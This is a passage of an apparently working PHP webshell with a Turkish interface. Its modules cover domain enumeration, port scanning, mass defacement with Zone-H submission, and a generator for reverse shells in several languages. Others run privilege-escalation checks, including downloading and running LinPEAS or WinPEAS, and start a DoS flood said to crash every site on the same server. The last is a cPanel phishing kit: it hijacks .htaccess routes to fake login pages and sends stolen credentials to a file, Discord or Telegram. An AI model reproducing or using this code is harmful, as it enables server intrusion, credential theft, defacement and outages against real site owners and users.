<div class="card"><div class="card-header"><i class="bi bi-globe"></i> DOMAIN LİSTER</div><div class="card-body"><?php function m1(){$f=@file('/etc/named.conf'); if(!$f)return false; $d=array(); foreach($f as $l){if(preg_match('/zone "([^"]+)"/',$l,$m)) $d[]=$m[1];} return $d;} function m2(){$f=@file('/etc/httpd/conf/httpd.conf')?:@file('/etc/apache2/apache2.conf')?:@file('/usr/local/apache2/conf/httpd.conf'); if(!$f)return false; $d=array(); foreach($f as $l){if(preg_match('/ServerName\s+([^\s]+)/',$l,$m)) $d[]=$m[1]; if(preg_match('/ServerAlias\s+([^\s]+)/',$l,$m)){$parts=preg_split('/\s+/',trim($m[1])); foreach($parts as $p)$d[]=$p;}} return $d;} function m3(){$dirs=glob('/home/*/public_html'); $d=array(); foreach($dirs as $dir){$user=basename(dirname($dir)); $d[]=$user.'.local';} return $d;} function m4(){$files=glob('/etc/valiases/*'); $d=array(); foreach($files as $f){if(is_file($f)) $d[]=basename($f);} return $d;} function m5(){$f1=glob('/etc/named/*.db'); $f2=glob('/var/named/*.db'); $d=array(); foreach(array_merge($f1,$f2) as $f) $d[]=basename($f,'.db'); return $d;} function m6(){$f=@file('/etc/psa/psa.conf'); if(!$f)return false; $d=array(); foreach($f as $l){if(preg_match('/^WEBMASTER_DOMAIN\s+(.+)/',$l,$m)) $d[]=$m[1];} return $d;} function m7(){$files=glob('/etc/nginx/sites-enabled/*'); $d=array(); foreach($files as $nf){$c=@file_get_contents($nf); if($c&&preg_match('/server_name\s+([^;]+)/',$c,$m)){$parts=preg_split('/\s+/',trim($m[1])); foreach($parts as $p)$d[]=$p;}} return $d;} function m8(){$f=@file('/etc/dnsmasq.conf'); if(!$f)return false; $d=array(); foreach($f as $l){if(preg_match('/domain=([^\s]+)/',$l,$m)) $d[]=$m[1];} return $d;} function m9(){$f=@file('/etc/hosts'); if(!$f)return false; $d=array(); foreach($f as $l){if(preg_match('/\s+([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/',$l,$m)) $d[]=$m[1];} return $d;} function m10(){$files=glob('/etc/httpd/conf.d/*.conf'); $d=array(); foreach($files as $cf){$c=@file_get_contents($cf); if($c&&preg_match('/ServerName\s+([^\s]+)/',$c,$m)) $d[]=$m[1];} return $d;} if(isset($_POST['method'])){$m=(int)$_POST['method']; $func='m'.$m; if(function_exists($func)){$r=$func(); if(is_array($r)&&count($r)>0){echo '<div class="alert alert-success"><h4>Bulunan domainler:</h4><ul>'; foreach(array_unique($r) as $d){if(!empty($d)) echo '<li>'.htmlspecialchars($d).'</li>';} echo '</ul></div>';} else echo '<div class="alert alert-danger">Domain bulunamadı!</div>';}} ?><form method="post"><select name="method" class="form-control"><option value="1">/etc/named.conf</option><option value="2">Apache vhosts</option><option value="3">Cpanel</option><option value="4">/etc/valiases/</option><option value="5">/etc/named/*.db</option><option value="6">Plesk</option><option value="7">Nginx</option><option value="8">dnsmasq</option><option value="9">/etc/hosts</option><option value="10">/etc/httpd/conf.d/</option></select><button type="submit" class="btn btn-primary mt-20"><i class="bi bi-search"></i> Listele</button></form></div></div>
<?php endif; ?>
<?php if($action == 'port_scanner'): ?>
<div class="card"><div class="card-header"><i class="bi bi-hdd-network"></i> PORT SCANNER</div><div class="card-body"><?php if(isset($_POST['host'])&&isset($_POST['ports'])){$h=$_POST['host']; $pl=explode(',',str_replace(' ','',$_POST['ports'])); $ps=array(); foreach($pl as $p) if(is_numeric($p)&&$p>0&&$p<65536) $ps[]=(int)$p; if(empty($ps)) $ps=array(21,22,23,25,80,110,143,443,445,465,993,995,3306,3389,5432,5900,6379,8080,8443,8888); $op=port_scan($h,$ps,$_POST['timeout']??1); if(count($op)>0){echo '<div class="alert alert-success"><h4>Açık portlar:</h4><ul>'; foreach($op as $p){$s=getservbyport($p,'tcp')?:'bilinmiyor'; echo '<li><strong>'.$p.'</strong> ('.$s.')</li>';} echo '</ul></div>';}else echo '<div class="alert alert-warning">Açık port bulunamadı!</div>';} ?><form method="post"><input type="text" class="form-control" name="host" placeholder="Hedef IP/Domain" value="127.0.0.1"><input type="text" class="form-control mt-10" name="ports" placeholder="Portlar" value="21,22,25,80,443,3306,3389,8080"><input type="number" class="form-control mt-10" name="timeout" placeholder="Timeout" value="1" min="1"><button type="submit" class="btn btn-primary mt-10"><i class="bi bi-search"></i> Tara</button></form></div></div>
<?php endif; ?>
<?php if($action == 'mass_deface'): ?>
<div class="card"><div class="card-header"><i class="bi bi-exclamation-triangle"></i> MASS DEFACER</div><div class="card-body"><?php $hd=get_all_home_dirs(); if(isset($_POST['deface'])){$c=$_POST['content']; $p=$_POST['pattern']??'index'; $d=mass_deface($hd,$c,$p); if(count($d)>0){echo '<div class="alert alert-success"><h4>'.count($d).' dosya deface edildi:</h4><ul>'; foreach($d as $f)echo '<li>'.$f.'</li>'; echo '</ul></div>';}else echo '<div class="alert alert-danger">Hiçbir dosya deface edilemedi!</div>';} ?><form method="post"><textarea class="form-control" name="content" rows="10" placeholder="Deface içeriği"><?php echo htmlspecialchars('<html><head><title>Hacked by W4rN1ght</title><style>body{background:#000;color:#9c27b0;}</style></head><body><center><h1>Hacked by W4rN1ght</h1><p>Mr.Moriarty</p></center></body></html>'); ?></textarea><input type="text" class="form-control mt-10" name="pattern" placeholder="Pattern" value="index"><button type="submit" name="deface" class="btn btn-danger mt-10"><i class="bi bi-exclamation-triangle"></i> DEFACE BAŞLAT</button></form></div></div>
<?php endif; ?>
<?php if($action == 'zoneh'): ?>
<div class="card"><div class="card-header"><i class="bi bi-send"></i> ZONE-H SUBMIT</div><div class="card-body"><div class="grid-2"><div class="card"><div class="card-header">Tekli</div><div class="card-body"><form method="post"><input type="text" class="form-control" name="url" placeholder="URL"><input type="text" class="form-control mt-10" name="defacer" placeholder="Defacer" value="W4rN1ght"><button type="submit" class="btn btn-primary mt-10"><i class="bi bi-send"></i> Gönder</button></form></div></div><div class="card"><div class="card-header">Toplu</div><div class="card-body"><form method="post"><input type="text" class="form-control" name="defacer" placeholder="Defacer" value="W4rN1ght"><button type="submit" name="mass_zoneh" class="btn btn-warning mt-10"><i class="bi bi-send-plus"></i> Tüm Domainleri Bildir</button></form></div></div></div><?php if(isset($_POST['url'])&&isset($_POST['defacer'])){$r=zoneh_submit($_POST['url'],$_POST['defacer']); echo $r?'<div class="alert alert-success mt-10">Başarılı</div>':'<div class="alert alert-danger mt-10">Başarısız</div>';} if(isset($_POST['mass_zoneh'])){echo '<div class="alert alert-info mt-10">Toplu gönderim başlatıldı...</div>';} ?></div></div>
<?php endif; ?>
<?php if($action == 'reverse_shell'): ?>
<div class="card"><div class="card-header"><i class="bi bi-arrow-return-right"></i> REVERSE SHELL GENERATOR</div><div class="card-body"><div class="grid-3"><?php $sh=array('PHP','Python','Bash','Perl','Ruby','Netcat'); foreach($sh as $s){ echo '<div class="card"><div class="card-header">'.$s.'</div><div class="card-body">'; if(isset($_POST[strtolower($s).'_ip'])&&isset($_POST[strtolower($s).'_port'])){$ip=$_POST[strtolower($s).'_ip']; $port=$_POST[strtolower($s).'_port']; if($s=='PHP') $c='<?php $sock=fsockopen("'.$ip.'",'.$port.');$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);proc_close($proc);?>'; elseif($s=='Python') $c='python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$ip.'",'.$port.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''; elseif($s=='Bash') $c='bash -i >& /dev/tcp/'.$ip.'/'.$port.' 0>&1'; elseif($s=='Perl') $c='perl -e \'use Socket;$i="'.$ip.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}\''; elseif($s=='Ruby') $c='ruby -rsocket -e \'c=TCPSocket.new("'.$ip.'",'.$port.');while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''; else $c='nc -e /bin/sh '.$ip.' '.$port; echo '<div class="terminal"><pre>'.htmlspecialchars($c).'</pre></div><button class="btn btn-success btn-sm" onclick="navigator.clipboard.writeText(\''.addslashes($c).'\')"><i class="bi bi-clipboard"></i> Kopyala</button>'; } echo '<form method="post"><input type="text" class="form-control" name="'.strtolower($s).'_ip" placeholder="IP" value="127.0.0.1"><input type="number" class="form-control mt-10" name="'.strtolower($s).'_port" placeholder="Port" value="4444"><button type="submit" class="btn btn-primary mt-10"><i class="bi bi-arrow-return-right"></i> Oluştur</button></form></div></div>'; } ?></div></div></div>
<?php endif; ?>
<?php if($action == 'privesc'): ?>
<div class="card">
    <div class="card-header"><i class="bi bi-shield-lock"></i> PRIVILEGE ESCALATION SCANNER</div>
    <div class="card-body">
        <?php
        if(isset($_POST['scan_privesc'])) {
            echo '<div class="alert alert-info"><i class="bi bi-info-circle"></i> Tarama başlatıldı...</div>';
            if(!$is_windows) {
                echo '<div class="card mt-10"><div class="card-header"><i class="bi bi-person"></i> Kullanıcı Bilgileri</div><div class="card-body"><pre>' . execute_command('id; uname -a; cat /etc/issue 2>/dev/null') . '</pre></div></div>';
                echo '<div class="card mt-10"><div class="card-header"><i class="bi bi-shield"></i> Sudo -l</div><div class="card-body"><div class="terminal"><pre>' . htmlspecialchars(execute_command('sudo -l 2>&1')) . '</pre></div></div></div>';
                echo '<div class="card mt-10"><div class="card-header"><i class="bi bi-lock"></i> SUID Dosyaları</div><div class="card-body"><div class="terminal"><pre>' . htmlspecialchars(execute_command('find / -perm -4000 -type f 2>/dev/null | head -50')) . '</pre></div></div></div>';
                echo '<div class="card mt-10"><div class="card-header"><i class="bi bi-pencil"></i> Yazılabilir Dosyalar</div><div class="card-body"><div class="terminal"><pre>' . htmlspecialchars(execute_command('find / -writable -type f 2>/dev/null | grep -v "^/proc" | grep -v "^/sys" | head -50')) . '</pre></div></div></div>';
                echo '<div class="card mt-10"><div class="card-header"><i class="bi bi-clock"></i> Crontab</div><div class="card-body"><div class="terminal"><pre>' . htmlspecialchars(execute_command('cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null')) . '</pre></div></div></div>';
                echo '<div class="card mt-10"><div class="card-header"><i class="bi bi-diagram-3"></i> PATH Kontrolü</div><div class="card-body"><div class="terminal"><pre>' . htmlspecialchars(execute_command('echo $PATH')) . '</pre></div></div></div>';
            } else {
                echo '<div class="card mt-10"><div class="card-header"><i class="bi bi-person"></i> Kullanıcı Bilgileri</div><div class="card-body"><pre>' . execute_command('whoami; net user %username%') . '</pre></div></div>';
                echo '<div class="card mt-10"><div class="card-header"><i class="bi bi-shield"></i> Yetkiler</div><div class="card-body"><div class="terminal"><pre>' . htmlspecialchars(execute_command('whoami /priv')) . '</pre></div></div></div>';
                echo '<div class="card mt-10"><div class="card-header"><i class="bi bi-group"></i> Gruplar</div><div class="card-body"><div class="terminal"><pre>' . htmlspecialchars(execute_command('net user %username% | findstr /i "group"')) . '</pre></div></div></div>';
            }
            echo '<div class="alert alert-success mt-20"><i class="bi bi-check-circle"></i> Tarama tamamlandı!</div>';
        }
        if(isset($_POST['run_linpeas'])) {
            echo '<div class="alert alert-info"><i class="bi bi-info-circle"></i> LinPEAS indiriliyor ve arka planda çalıştırılıyor...</div>';
            execute_command('wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh 2>/dev/null || curl -s -o /tmp/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh');
            execute_command('chmod +x /tmp/linpeas.sh');
            execute_command('nohup /tmp/linpeas.sh -a > linpeas_output.txt 2>&1 &', true);
            echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> LinPEAS arka planda çalıştırılıyor. Çıktı: linpeas_output.txt</div>';
        }
        if(isset($_POST['run_winpeas'])) {
            echo '<div class="alert alert-info"><i class="bi bi-info-circle"></i> WinPEAS indiriliyor ve arka planda çalıştırılıyor...</div>';
            execute_command('powershell -Command "Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile C:\\Windows\\Temp\\winpeas.exe"');
            execute_command('start /B C:\\Windows\\Temp\\winpeas.exe > winpeas_output.txt 2>&1', true);
            echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> WinPEAS arka planda çalıştırılıyor. Çıktı: winpeas_output.txt</div>';
        }
        ?>
        <form method="post">
            <div class="btn-group">
                <button type="submit" name="scan_privesc" class="btn btn-primary"><i class="bi bi-search"></i> Hızlı PrivEsc Tara</button>
                <?php if(!$is_windows): ?>
                <button type="submit" name="run_linpeas" class="btn btn-warning"><i class="bi bi-download"></i> LinPEAS Çalıştır (arka plan)</button>
                <?php else: ?>
                <button type="submit" name="run_winpeas" class="btn btn-warning"><i class="bi bi-download"></i> WinPEAS Çalıştır (arka plan)</button>
                <?php endif; ?>
            </div>
        </form>
    </div>
</div>
<?php endif; ?>
<?php if($action == 'ssh_creator'): ?>
<div class="card">
    <div class="card-header"><i class="bi bi-key"></i> SSH CREATOR</div>
    <div class="card-body">
        <?php
        if(isset($_POST['username']) && isset($_POST['key_type'])) {
            $username = $_POST['username'];
            $key_type = $_POST['key_type'];
            $bits = (int)$_POST['bits'];
            $result = ssh_create_key($username, $key_type, $bits);
            if($result) {
                echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> SSH key oluşturuldu!</div>';
                echo '<div class="card"><div class="card-header">Public Key</div><div class="card-body"><div class="terminal"><pre>' . htmlspecialchars($result['public']) . '</pre></div></div></div>';
                echo '<div class="card"><div class="card-header">Private Key Konumu</div><div class="card-body"><code>' . $result['private'] . '</code></div></div>';
            } else {
                echo '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> SSH key oluşturulamadı!</div>';
            }
        }
        ?>
        <form method="post">
            <div class="form-group">
                <label><i class="bi bi-person"></i> Kullanıcı adı:</label>
                <input type="text" class="form-control" name="username" placeholder="örnek: www-data, root, user" value="<?php echo $username; ?>">
            </div>
            <div class="form-group">
                <label><i class="bi bi-key"></i> Key tipi:</label>
                <select name="key_type" class="form-control">
                    <option value="rsa">RSA (4096 bit)</option>
                    <option value="ed25519">ED25519 (en güvenli)</option>
                    <option value="ecdsa">ECDSA (521 bit)</option>
                </select>
            </div>
            <div class="form-group">
                <label><i class="bi bi-arrow-left-right"></i> Bit uzunluğu (RSA için):</label>
                <input type="number" class="form-control" name="bits" value="4096" min="2048" max="8192">
            </div>
            <button type="submit" class="btn btn-primary"><i class="bi bi-key"></i> SSH Key Oluştur</button>
        </form>
    </div>
</div>
<?php endif; ?>
<?php if($action == 'dos_flood'): ?>
<div class="card">
    <div class="card-header"><i class="bi bi-lightning"></i> INTERNAL DOS FLOODER</div>
    <div class="card-body">
        <?php
        if(isset($_POST['target_ip']) && isset($_POST['duration']) && isset($_POST['threads'])) {
            $target_ip = $_POST['target_ip'];
            $duration = (int)$_POST['duration'];
            $threads = (int)$_POST['threads'];
            $result = internal_dos_flood($target_ip, $duration, $threads);
            if($result) {
                echo '<div class="alert alert-success"><i class="bi bi-check-circle"></i> DoS saldırısı başlatıldı!</div>';
                echo '<div class="alert alert-warning"><i class="bi bi-exclamation-triangle"></i> Hedef: ' . $target_ip . ' | Süre: ' . $duration . ' sn | Thread: ' . $threads . '</div>';
                echo '<p class="text-muted">Saldırı arka planda çalışıyor. Aynı IP\'deki tüm siteler çökecektir.</p>';
            } else {
                echo '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle"></i> DoS saldırısı başlatılamadı!</div>';
            }
        }
        ?>
        <form method="post">
            <div class="form-group">
                <label><i class="bi bi-hdd-network"></i> Hedef IP:</label>
                <input type="text" class="form-control" name="target_ip" placeholder="192.168.1.1 veya domain.com" value="<?php echo $server_ip; ?>">
            </div>
            <div class="form-group">
                <label><i class="bi bi-clock"></i> Süre (saniye):</label>
                <input type="number" class="form-control" name="duration" value="60" min="10" max="3600">
            </div>
            <div class="form-group">
                <label><i class="bi bi-diagram-3"></i> Thread sayısı:</label>
                <input type="number" class="form-control" name="threads" value="50" min="10" max="500">
            </div>
            <button type="submit" class="btn btn-danger"><i class="bi bi-lightning"></i> DOS BAŞLAT</button>
        </form>
        <p class="text-muted mt-10"><i class="bi bi-info-circle"></i> Aynı IP'de barınan tüm siteleri çökertir. Arka planda çalışır, webshell çökmez.</p>
    </div>
</div>
<?php endif; ?>
<?php if($action == 'cpanel_fake'): ?>
<div class="card">
    <div class="card-header"><i class="bi bi-window"></i> CPANEL FAKE MAKER - BİREBİR KLON</div>
    <div class="card-body">
        
        <?php
        // MEVCUT DURUM KONTROLÜ
        $is_active = false;
        $active_login_paths = array();
        $active_reset_paths = array();
        
        if(file_exists('.htaccess')) {
            $htaccess = file_get_contents('.htaccess');
            // SADECE BİZİM BLOĞUMUZU KONTROL ET
            if(preg_match('/# W4rN1ght Fake Page Maker.*?# (?:Son|EN) /s', $htaccess)) {
                $is_active = true;
                
                // Blok içindeki login yollarını bul
                if(preg_match_all('/RewriteRule \^([a-zA-Z0-9_-]+)\/\?\$ kpanel\.php/', $htaccess, $login_matches)) {
                    $active_login_paths = $login_matches[1];
                }
                
                // Blok içindeki reset yollarını bul
                if(preg_match_all('/RewriteRule \^([a-zA-Z0-9_-]+)\/\?\$ reset\.php/', $htaccess, $reset_matches)) {
                    $active_reset_paths = $reset_matches[1];
                }
            }
        }
        
        if($is_active):
        ?>
        <div class="alert alert-success">
            <i class="bi bi-check-circle"></i> 
            <strong>✅ BU YAPI ŞU AN AKTİF ÇALIŞMAKTADIR!</strong>
        </div>
        
        <div class="card mt-10">
            <div class="card-header"><i class="bi bi-list"></i> AKTİF TUZAK YOLLARI</div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-6">
                        <h6><i class="bi bi-box-arrow-in-right"></i> LOGIN SAYFALARI (kpanel.php):</h6>
                        <ul>
                            <?php foreach($active_login_paths as $path): ?>
                            <li><code>/<?php echo $path; ?></code> → <a href="/<?php echo $path; ?>" target="_blank">test et</a></li>
                            <?php endforeach; ?>
                        </ul>
                    </div>
                    <div class="col-md-6">
                        <h6><i class="bi bi-key"></i> PASSWORD RESET SAYFALARI (reset.php):</h6>
                        <ul>
                            <?php foreach($active_reset_paths as $path): ?>
                            <li><code>/<?php echo $path; ?></code> → <a href="/<?php echo $path; ?>" target="_blank">test et</a></li>
                            <?php endforeach; ?>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="alert alert-warning mt-10">
            <i class="bi bi-exclamation-triangle"></i>
            <strong>⚠️ UYARI:</strong> Eğer tekrar oluştur derseniz, eski yapı tamamen silinecek ve son yaptığınız yapı aktif çalışmaya başlayacaktır!
        </div>
        
        <?php endif; ?>
        
        <?php
        if(isset($_POST['log_method'])) {
            $log_method = $_POST['log_method'];
            $webhook = $_POST['webhook'] ?? '';
            $bot_token = $_POST['bot_token'] ?? '';
            $chat_id = $_POST['chat_id'] ?? '';
            
            // Kullanıcıdan özel dizinleri al
            $custom_paths = array();
            if(!empty($_POST['custom_paths'])) {
                $custom_paths = explode("\n", trim($_POST['custom_paths']));
                $custom_paths = array_map('trim', $custom_paths);
                $custom_paths = array_filter($custom_paths);
            }
            
            // Şifre sıfırlama dizinlerini al
            $reset_paths = array();
            if(!empty($_POST['reset_paths'])) {
                $reset_paths = explode("\n", trim($_POST['reset_paths']));
                $reset_paths = array_map('trim', $reset_paths);
                $reset_paths = array_filter($reset_paths);
            }
            
            $result = cpanel_fake_maker($log_method, $webhook, $bot_token, $chat_id, $custom_paths, $reset_paths);
            echo $result;
        }
        ?>
        
        <form method="post" onsubmit="return confirm('⚠️ Eski yapı silinecek ve yenisi oluşturulacak! Devam etmek istiyor musunuz?');">
            <div class="row">
                <div class="col-md-6">
                    <div class="form-group">
                        <label><i class="bi bi-journal"></i> Loglama yöntemi:</label>
                        <select name="log_method" class="form-control" id="log_method" onchange="toggleLogOptions()">
                            <option value="file">Sadece dosyaya kaydet</option>
                            <option value="discord">Discord webhook</option>
                            <option value="telegram">Telegram bot</option>
                            <option value="both">Hepsi (dosya + webhook)</option>
                        </select>
                    </div>
                    
                    <div id="discord_options" style="display:none;">
                        <div class="form-group">
                            <label><i class="bi bi-discord"></i> Discord webhook URL:</label>
                            <input type="text" class="form-control" name="webhook" placeholder="https://discord.com/api/webhooks/...">
                        </div>
                    </div>
                    
                    <div id="telegram_options" style="display:none;">
                        <div class="form-group">
                            <label><i class="bi bi-telegram"></i> Bot token:</label>
                            <input type="text" class="form-control" name="bot_token" placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11">
                        </div>
                        <div class="form-group">
                            <label><i class="bi bi-chat"></i> Chat ID:</label>
                            <input type="text" class="form-control" name="chat_id" placeholder="123456789">
                        </div>
                    </div>
                </div>
                
                <div class="col-md-6">
                    <div class="form-group">
                        <label><i class="bi bi-folder-plus"></i> Özel tuzak dizinler (her satıra bir tane)</label>
                        <textarea class="form-control" name="custom_paths" rows="4" placeholder="panel&#10;yonetim&#10;siteadmin&#10;backoffice">panel
yonetim</textarea>
                        <small class="text-muted">Bu dizinlere girildiğinde kpanel.php açılır</small>
                    </div>
                    
                    <div class="form-group">
                        <label><i class="bi bi-key"></i> Şifre sıfırlama dizinleri (her satıra bir tane)</label>
                        <textarea class="form-control" name="reset_paths" rows="4" placeholder="resetpass&#10;sifre-sifirla&#10;forgot-password">admin-sifre-reset</textarea>
                        <small class="text-muted">Bu dizinlere girildiğinde reset.php açılır</small>
                    </div>
                </div>
            </div>
            
            <div class="alert alert-info mt-10">
                <i class="bi bi-info-circle"></i> 
                <strong>login için varsayılanlar:</strong><br>
                <code>/cpane1</code>, <code>/cpaneI</code>, <code>/ⅽpanel</code>, <code>/admin</code>, <code>/administrator</code>, <code>/yonetim</code>, <code>/cp</code>, <code>/control</code><br>
                <strong>password reset için varsayılanlar:</strong><br>
                <code>/resetpass</code>, <code>/passwordreset</code>, <code>/sifre-sifirla</code>, <code>/password-reset</code>, <code>/forgot-password</code>
            </div>
            
            <div class="alert alert-warning mt-10">
                <i class="bi bi-exclamation-triangle"></i>
                <strong>NOT:</strong> Bu işlem .htaccess dosyasına yönlendirme kuralları ekler. 
                Eğer sunucuda gerçek cPanel varsa, servisleri durdurmanız gerekebilir.
            </div>
            
            <button type="submit" class="btn btn-primary btn-lg mt-10"><i class="bi bi-shield"></i> TUZAKLARI KUR</button>
        </form>
        
        <p class="text-muted mt-10">
            <i class="bi bi-info-circle"></i> 
            Seçtiğiniz tüm dizinlerde fake sayfalar açılır. 
            Normal girişler kpanel.php'ye, şifre sıfırlama istekleri reset.php'ye düşer.
            Çalınan bilgiler seçtiğiniz yere gönderilir.
        </p>
    </div>
</div>

<script>
function toggleLogOptions() {
    var method = document.getElementById('log_method').value;
    document.getElementById('discord_options').style.display = (method == 'discord' || method == 'both') ? 'block' : 'none';
    document.getElementById('telegram_options').style.display = (method == 'telegram' || method == 'both') ? 'block' : 'none';
}
</script>
<?php endif; ?>


<?php
// ============ CPANEL FAKE MAKER FONKSİYONU - KLASİK TEMALI ============
function cpanel_fake_maker($log_method = 'file', $webhook = '', $bot_token = '', $chat_id = '', $custom_paths = array(), $custom_reset_paths = array()) {
    
    $messages = array();
    $success = true;
    
    // ============ 1. HTACCESS DOSYASINI TAMAMEN TEMİZLE (TÜM KURALLAR SİLİNİR) ============
    if(file_exists('.htaccess')) {
        $htaccess_content = file_get_contents('.htaccess');
        $original_length = strlen($htaccess_content);
        
        // 1. YÖNTEM: W4rN1ght bloğunu sil (eğer varsa)
        $pattern = '/# W4rN1ght Fake Page Maker.*?# (?:Son|EN) .*?(?:\n|$)/s';
        $htaccess_content = preg_replace($pattern, '', $htaccess_content);
        
        // 2. YÖNTEM: Tüm kpanel.php ve reset.php yönlendirmelerini sil
        $lines = explode("\n", $htaccess_content);
        $clean_lines = array();
        $skip_block = false;
        
        foreach($lines as $line) {
            $line = rtrim($line); // Sondaki boşlukları temizle
            
            // Eğer W4rN1ght bloğu başlıyorsa, atla
            if(strpos($line, '# W4rN1ght Fake Page Maker') !== false) {
                $skip_block = true;
                continue;
            }
            
            // Blok sonu gelirse, atlamayı bitir
            if($skip_block && strpos($line, '# SON') !== false) {
                $skip_block = false;
                continue;
            }
            
            // Eğer blok içindeysek, bu satırı ekleme
            if($skip_block) {
                continue;
            }
            
            // RewriteRule içeren ve kpanel.php veya reset.php'ye yönlendiren satırları sil
            if(preg_match('/RewriteRule.*(kpanel\.php|reset\.php)/i', $line)) {
                continue; // Bu satırı atla (sil)
            }
            
            // ErrorDocument 404/403 satırlarını sil
            if(preg_match('/ErrorDocument (404|403).*kpanel\.php/i', $line)) {
                continue;
            }
            
            // Magic Revision yönlendirmelerini sil
            if(strpos($line, 'cPanel_magic_revision') !== false) {
                continue;
            }
            
            // Boş olmayan satırları ekle
            if(trim($line) !== '') {
                $clean_lines[] = $line;
            }
        }
        
        // Temizlenmiş içeriği birleştir
        $new_htaccess = implode("\n", $clean_lines);
        
        // Fazla satır sonlarını temizle
        $new_htaccess = preg_replace("/\n{3,}/", "\n\n", $new_htaccess);
        $new_htaccess = trim($new_htaccess);
        
        // Eğer hiç içerik kalmadıysa ve orijinal dosya vardı ama şimdi boşsa, dosyayı sil
        if(empty($new_htaccess)) {
            unlink('.htaccess');
            $messages[] = "✅ .htaccess dosyası tamamen silindi (içerik boş)";
        } else {
            // Değişiklik var mı kontrol et
            if($original_length != strlen($new_htaccess)) {
                file_put_contents('.htaccess', $new_htaccess);
                $messages[] = "✅ .htaccess dosyası temizlendi - Tüm kpanel.php/reset.php kuralları silindi";
            } else {
                $messages[] = "ℹ️ .htaccess dosyasında temizlenecek kural bulunamadı";
            }
        }
    }
    // Eski panel dosyalarını temizle
    if(file_exists('kpanel.php')) unlink('kpanel.php');
    if(file_exists('reset.php')) unlink('reset.php');
    
    // ============ 2. TUZAK KURULACAK DİZİNLER ============
    $trap_paths = array(
        'cpane1', 'cpaneI', 'ⅽpanel', 'admin', 'administrator', 
        'yonetim', 'cp', 'control', 'panel', 'management'
    );
    
    if(!empty($custom_paths) && is_array($custom_paths)) {
        foreach($custom_paths as $path) {
            $path = trim($path, '/ ');
            if(!empty($path)) $trap_paths[] = $path;
        }
    }
    
    // ============ 3. PASSWORD RESET DİZİNLERİ ============
    $reset_paths = array(
        'resetpass', 'passwordreset', 'sifre-sifirla', 
        'password-reset', 'forgot-password', 'sifremi-unuttum'
    );
    
    if(!empty($custom_reset_paths) && is_array($custom_reset_paths)) {
        foreach($custom_reset_paths as $path) {
            $path = trim($path, '/ ');
            if(!empty($path)) $reset_paths[] = $path;
        }
    }
    
    // ============ 4. YENİ .HTACCESS KURALLARI ============
    //geçmişteki tuzak yapısını temizledikten sonra, yeni tuzak dizinleriyle .htaccess içeriği oluştur
    $htaccess_content = "\n# W4rN1ght Fake Page Maker - EN SON HALİ\n";
    $htaccess_content .= "# Oluşturulma: " . date('Y-m-d H:i:s') . "\n";
    $htaccess_content .= "RewriteEngine On\nRewriteBase /\n\n";
    
    foreach($trap_paths as $path) {
        $htaccess_content .= "RewriteRule ^$path/?$ kpanel.php [QSA,L]\n";
        $htaccess_content .= "RewriteRule ^$path/(.*)$ kpanel.php?$1 [QSA,L]\n";
    }
    
    foreach($reset_paths as $path) {
        $htaccess_content .= "RewriteRule ^$path/?$ reset.php [QSA,L]\n";
        $htaccess_content .= "RewriteRule ^$path/(.*)$ reset.php?$1 [QSA,L]\n";
    }
    
    $htaccess_content .= "\n# Magic Revision yönlendirmeleri\n";
    $htaccess_content .= "RewriteRule ^cPanel_magic_revision_.*$ kpanel.php [QSA,L]\n";
    $htaccess_content .= "\nErrorDocument 404 /kpanel.php\n";
    $htaccess_content .= "ErrorDocument 403 /kpanel.php\n";
    $htaccess_content .= "\n# SON \n";
    
    file_put_contents('.htaccess', $htaccess_content, FILE_APPEND);
    $messages[] = "✅ Yeni .htaccess kuralları eklendi";
    
    // ============ 5. ANA FAKE PANEL - KLASİK CPANEL TEMASI ============
$fake_panel = '<?php
error_reporting(0);
ini_set("display_errors", 0);

$log_method = "' . $log_method . '";
$webhook = "' . $webhook . '";
$bot_token = "' . $bot_token . '";
$chat_id = "' . $chat_id . '";

function send_log($entry) {
    global $log_method, $webhook, $bot_token, $chat_id;
    if($log_method == "file" || $log_method == "both") {
        @file_put_contents("stolen_creds.txt", $entry, FILE_APPEND | LOCK_EX);
    }
    if(($log_method == "discord" || $log_method == "both") && !empty($webhook)) {
        $ch = @curl_init($webhook);
        if($ch) {
            @curl_setopt($ch, CURLOPT_POST, 1);
            @curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["content" => "```" . $entry . "```"]));
            @curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 2); @curl_exec($ch); @curl_close($ch);
        }
    }
    if(($log_method == "telegram" || $log_method == "both") && !empty($bot_token) && !empty($chat_id)) {
        $ch = @curl_init("https://api.telegram.org/bot" . $bot_token . "/sendMessage");
        if($ch) {
            @curl_setopt($ch, CURLOPT_POST, 1);
            @curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => $chat_id, "text" => $entry]);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 2); @curl_exec($ch); @curl_close($ch);
        }
    }
}

if($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["user"] ?? "";
    $password = $_POST["pass"] ?? "";
    if(!empty($username) && !empty($password)) {
